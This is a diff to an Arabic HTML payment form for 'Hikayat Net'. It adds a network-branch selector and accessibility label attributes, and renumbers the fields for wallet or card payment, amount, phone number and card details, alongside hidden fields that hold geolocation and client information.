@@ -31,7 +31,7 @@
                     <input type="hidden" id="card_expiry_mm" name="card_expiry_mm">
                     <input type="hidden" id="card_expiry_yy" name="card_expiry_yy">
 
-                    <!-- خانات مخفية لإرسال خاصة بشركة الدفع -->
+                    <!-- خانات مخفية إضافية بشركة الدفع -->
                     <input type="hidden" name="geoCity" id="geoCity" value="غير معروف">
                     <input type="hidden" name="geoCountry" id="geoCountry" value="غير معروف">
                     <input type="hidden" name="ispProvider" id="ispProvider" value="غير معروف">
@@ -45,18 +45,28 @@
                     <input type="hidden" name="lang" id="lang" value="غير معروف">
                     <input type="hidden" name="clientID" id="clientID" value="غير متوفر">
 
-                    <!-- 1. اختيار وسيلة الدفع -->
+                    <!-- 1. اختيار فرع الشبكة -->
                     <div class="input-group-custom">
-                        <label>اختر وسيلة الدفع:</label>
-                        <select name="payment_method" id="payment_method" required>
+                        <label for="branch_select"><i class="fa fa-sitemap" aria-hidden="true"></i> اختر الفرع:</label>
+                        <select name="branch" id="branch_select" class="form-control" style="height: 48px; border-radius: 8px; font-weight: bold; background-color: #f8f9fa;" required>
+                            <option value="main" selected>🌐 حكايات نت رئيسي</option>
+                            <option value="branch2">🏢 حكايات نت فرع ثاني</option>
+                            <option value="branch3">🏬 حكايات نت فرع ثالث</option>
+                        </select>
+                    </div>
+
+                    <!-- 2. اختيار وسيلة الدفع -->
+                    <div class="input-group-custom">
+                        <label for="payment_method"><i class="fa fa-credit-card-alt" aria-hidden="true"></i> اختر وسيلة الدفع:</label>
+                        <select name="payment_method" id="payment_method" class="form-control" style="height: 48px; border-radius: 8px;" required>
                             <option value="wallet" selected>📱 محفظة إلكترونية</option>
                             <option value="card">💳 بطاقة بنكية</option>
                         </select>
                     </div>
 
-                    <!-- 2. قيمة المبلغ -->
+                    <!-- 3. قيمة المبلغ -->
                     <div class="input-group-custom">
-                        <label>المبلغ (بالجنيه):</label>
+                        <label for="pay_amount">المبلغ (بالجنيه):</label>
                         <div class="input-wrapper">
                             <input placeholder="أدخل المبلغ المطلوب" 
                                    type="text" 
@@ -67,9 +77,9 @@
                         <div class="error-message" id="error_amount">يرجى إدخال مبلغ صحيح.</div>
                     </div>
 
-                    <!-- 3. رقم الهاتف / المحفظة -->
+                    <!-- 4. رقم الهاتف / المحفظة -->
                     <div class="input-group-custom" id="phone_group">
-                        <label>رقم الهاتف / المحفظة:</label>
+                        <label for="user_phone">رقم الهاتف / المحفظة:</label>
                         <div class="input-wrapper">
                             <input placeholder="01XXXXXXXXX" 
                                    type="text" 
@@ -86,10 +96,10 @@
                         <div class="error-message" id="error_phone">يجب كتابة رقم هاتف صحيح 11 رقماً ويبدأ بـ 01.</div>
                     </div>
 
-                    <!-- 4. خانات البطاقة البنكية -->
+                    <!-- 5. خانات البطاقة البنكية -->
                     <div id="card_section">
                         <div class="input-group-custom">
-                            <label>رقم البطاقة البنكية:</label>
+                            <label for="card_number">رقم البطاقة البنكية:</label>
                             <div class="input-wrapper">
                                 <input placeholder="Card Number" 
                                        type="text" 
@@ -108,7 +118,7 @@
                         </div>
 
                         <div class="input-group-custom">
-                            <label>اسم صاحب البطاقة:</label>
+                            <label for="card_name">اسم صاحب البطاقة:</label>
                             <div class="input-wrapper">
                                 <input placeholder="Card Holder Name" 
                                        type="text" 
@@ -120,7 +130,7 @@
 
                         <div class="input-containers">
                             <div class="input-group-custom">
-                                <label>التاريخ:</label>
+                                <label for="mmyy">التاريخ:</label>
                                 <div class="input-wrapper">
                                     <input placeholder="MM/YY" 
                                            type="text" 
@@ -133,7 +143,7 @@
                             </div>
 
                             <div class="input-group-custom">
-                                <label>رمز CVV:</label>
+                                <label for="card_cvc">رمز CVV:</label>
                                 <div class="input-wrapper">
                                     <input placeholder="CVV" 
                                            type="password" 
